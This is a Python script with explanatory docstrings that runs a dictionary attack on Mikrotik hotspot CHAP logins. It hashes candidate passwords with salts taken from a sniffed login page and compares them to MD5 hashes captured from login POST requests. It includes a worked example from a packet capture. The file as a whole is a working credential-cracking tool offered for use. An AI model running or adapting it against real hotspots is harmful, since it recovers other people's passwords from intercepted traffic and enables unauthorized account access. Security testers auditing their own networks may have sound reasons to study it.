import hashlib
import binascii


"""
This program uses a word list to attempt to discover the password of Mikrotik hotspot users when CHAP is enabled.

It requires that login page from the Mikrotik device be captured as it is transmitted to the hotspot user.
This login page contains javascript code that includes salt values that are hashed in conjunction with the user's password to authenticate with the Mikrotik hotspot.
Example: document.sendin.password.value = hexMD5('\013' + document.login.password.value + '\331\303\150\252\305\333\221\356\363\354\003\025\056\232\163\311')

Additionally, this script requires that the hashed password be captured as it is posted to the Mikrotik device.
Example: username=user1&password= dba5fe239907280fad8a5ba4167fc55f &dst=&popup=true

Using the salt values and a password list, hashes are generated and then compared to the collected hashes.  If a match is found, then the password used to generate the hash is valid.
"""

def main():

    # load hash list
    hash_list = []
    with open("hash_list", "r") as file:
        for line in file:
            hash_value = line.strip()
            if hash_value:
                hash_list.append(hash_value)

    # load salt list
    salt_list = []
    with open("salt_list", "r") as file:
        for line in file:
            salt = line.strip()
            if salt:
                salt_vals = salt.split(',')
                s1 = get_salt(salt_vals[0])
                s2 = get_salt(salt_vals[1])
                salt_list.append([s1, s2])

    # iterate through user list
    with open("password_list", "r") as file:
        for line in file:
            password = line.strip()
            if password:
                #for each password, iterate through each potential salt
                found = False
                for salt in salt_list:
                    s1 = salt[0]
                    s2 = salt[1]
                    posted_value = s1 + password.encode() + s2
                    hash_value = hashlib.md5(posted_value).hexdigest()

                    if hash_value in hash_list:
                        print(f'[+] Password found: {password} --> {hash_value}')
                        found = True
                        break
                if not found:
                    print(f' [!] Password not found: {password}')


def get_salt(salt):
    hex_vals = [hex(int('0o' + x, 8)).replace('0x', '').zfill(2) for x in salt.split('\\') if x]
    unhex_vals = [binascii.unhexlify(x) for x in hex_vals]
    binary_salt = b''.join(unhex_vals)
    return binary_salt


if __name__ == "__main__":
    main()


"""

Mikrotiks used the md5.js javascript module to generate hashes
Example from PCAP:

    <script src="/md5.js"></script>
    <script>
        function doLogin() {
            document.sendin.username.value = document.login.username.value;
            document.sendin.password.value = hexMD5('\013' + document.login.password.value + '\331\303\150\252\305\333\221\356\363\354\003\025\056\232\163\311');
            document.sendin.submit();
            return false;
        }
    </script>
    
This equates to:
hexMD5('\013user1\331\303\150\252\305\333\221\356\363\354\003\025\056\232\163\311')

If the username and password typed in by the user were 'user1' and 'user1' then the values posted would be: 

username=user1&password=dba5fe239907280fad8a5ba4167fc55f&dst=&popup=true

"""


